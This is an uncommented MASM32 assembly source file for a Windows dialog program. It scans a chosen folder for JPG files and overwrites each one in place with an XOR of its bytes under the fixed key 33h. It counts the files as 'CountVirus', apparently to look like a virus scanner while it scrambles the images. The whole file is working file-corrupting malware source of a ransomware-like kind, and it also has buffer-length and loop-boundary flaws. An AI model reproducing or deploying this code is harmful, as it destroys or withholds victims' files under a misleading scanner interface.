.386
.model	flat, stdcall
option	casemap :none

include 					\masm32\include\windows.inc
include 					\masm32\include\user32.inc
include 					\masm32\include\kernel32.inc
include 					\masm32\include\shell32.inc
include 					\masm32\include\advapi32.inc
include 					\masm32\include\gdi32.inc
include 					\masm32\include\comctl32.inc
include 					\masm32\include\comdlg32.inc
include 					\masm32\include\masm32.inc
include 					\masm32\macros\macros.asm

includelib 					\masm32\lib\user32.lib
includelib 					\masm32\lib\kernel32.lib
includelib 					\masm32\lib\shell32.lib
includelib 					\masm32\lib\advapi32.lib
includelib 					\masm32\lib\gdi32.lib
includelib 					\masm32\lib\comctl32.lib
includelib 					\masm32\lib\comdlg32.lib
includelib 					\masm32\lib\masm32.lib
includelib 					\masm32\lib\winmm.lib


WndProc						proto		:DWORD,:DWORD,:DWORD,:DWORD 
List						proto		:DWORD,:DWORD
ScanForParticularFiles 		proto 		:HWND
CryptFile					proto		:HWND
Crypt						proto		:DWORD,:DWORD,:BYTE


.CONST
	Dialog 					equ 		1001
	ID_OUTPUT  				equ 		1005
	IDC_LISTBOX 			equ 		1004

.DATA
	Dect 					db 			"%d",0
	szFilter        		db 			"*.jpg",0
	cnt 					db 			0
	bKey					db			33h


.DATA? 
	hInstance				HINSTANCE	? 
	ThreadID 				dd 			?
	CountVirus 				dd 			?
	hthread 				dd 			?
	hFile					dd			?
	dwFileSize				dd			?
	dwBytesDone				dd			?
	hMemory					dd			?
	hBuffer					dd			?
	dpath 					db 			256 dup (?)
	hDir 					db 			256 dup (?)
	fpath 					db 			256 dup (?)
	cuntBuffer 				db 			8 dup(?)

.CODE
start:
    invoke GetModuleHandle, NULL 
    mov    hInstance,eax 
    invoke InitCommonControls
    invoke DialogBoxParam, hInstance, 1001, NULL, addr WndProc, NULL 
    invoke ExitProcess,eax 
    
WndProc proc hWin:DWORD, uMsg:DWORD, wParam:DWORD, lParam:DWORD
	.if uMsg == WM_INITDIALOG
		invoke GetCurrentDirectory,1024, ADDR hDir
		invoke SetDlgItemText,hWin,1015,addr hDir
		xor eax, eax
		ret
	.elseif uMsg == WM_COMMAND
		.if wParam ==1006
			invoke RtlZeroMemory,addr dpath,sizeof dpath
			invoke GetDlgItemText,hWin,1015,addr dpath,sizeof dpath
			invoke SetCurrentDirectory,ADDR dpath
			mov CountVirus,0
			invoke wsprintf,addr cuntBuffer,addr Dect,CountVirus
			invoke SetDlgItemText,hWin,1019,addr cuntBuffer
			invoke CreateThread,NULL,NULL,offset ScanForParticularFiles,hWin,NULL, ADDR ThreadID
			mov hthread,eax
		.endif
	.elseif uMsg == WM_CLOSE
		invoke EndDialog,hWin,0
	.endif
    xor eax, eax
    ret
WndProc endp

List proc hWin:HWND, pMsg:DWORD
	invoke SendDlgItemMessage,hWin,IDC_LISTBOX,LB_ADDSTRING,0,pMsg
	invoke SendDlgItemMessage,hWin,IDC_LISTBOX,WM_VSCROLL,SB_BOTTOM,0
	Ret
List EndP

ScanForParticularFiles proc hWnd:HWND
	LOCAL fnd      :WIN32_FIND_DATA
	LOCAL hFind    :DWORD
	invoke FindFirstFile, addr szFilter, addr fnd
	.if eax != INVALID_HANDLE_VALUE
		mov hFind, eax
		.repeat
			invoke GetCurrentDirectory,1024, ADDR hDir
			invoke lstrcat,addr fpath,addr hDir
			invoke lstrcat,addr fpath,chr$("\")
			invoke lstrcat,addr fpath,addr fnd.cFileName
			invoke List,hWnd,addr fpath
			inc CountVirus
			invoke wsprintf,addr cuntBuffer,addr Dect,CountVirus
			invoke SetDlgItemText,hWnd,1019,addr cuntBuffer
			invoke CryptFile,hWnd


			invoke RtlZeroMemory,addr fpath,sizeof fpath
			inc cnt
			.if cnt==25
				mov cnt,0
			.endif
			invoke FindNextFile, hFind, addr fnd
		.until eax==0            
		invoke FindClose,hFind    
	.endif  
	ret          

ScanForParticularFiles endp

CryptFile proc hWnd:HWND
	invoke	CreateFile, addr fpath, GENERIC_READ OR GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
	mov	hFile, eax
	.if eax == INVALID_HANDLE_VALUE
		jmp	err0rz
	.else
		invoke	GetFileSize, eax, 0
		mov	[dwFileSize], eax
		push	eax
		invoke	GlobalAlloc, GMEM_MOVEABLE, eax
		mov	[hMemory], eax
		invoke	GlobalLock, eax
		mov	[hBuffer], eax
		push	eax
			
		invoke	ReadFile, [hFile], eax, dwFileSize, OFFSET dwBytesDone, 0
		pop	edx
		pop	ecx
		mov	ah, bKey
		invoke	Crypt , [hBuffer], [dwFileSize], [bKey]
		invoke	SetFilePointer, [hFile], 0, 0, FILE_BEGIN
		invoke	WriteFile, [hFile], [hBuffer], [dwFileSize], OFFSET dwBytesDone, 0
			
		invoke	GlobalUnlock, [hMemory]
		invoke	GlobalFree, [hMemory]
		invoke	CloseHandle, [hFile]
	.endif
	RET
err0rz: 	
	invoke MessageBox, NULL,chr$("Error opening file!"), chr$("Error"), MB_ICONERROR
	RET
CryptFile endp
Crypt proc pszBuffer:DWORD, dwSize:DWORD, Key:BYTE
doxor:	mov	al, [edx+ecx]
	xor	al, ah
	mov	[edx+ecx], al
	dec	ecx
	jnz	doxor
	ret
Crypt endp

end start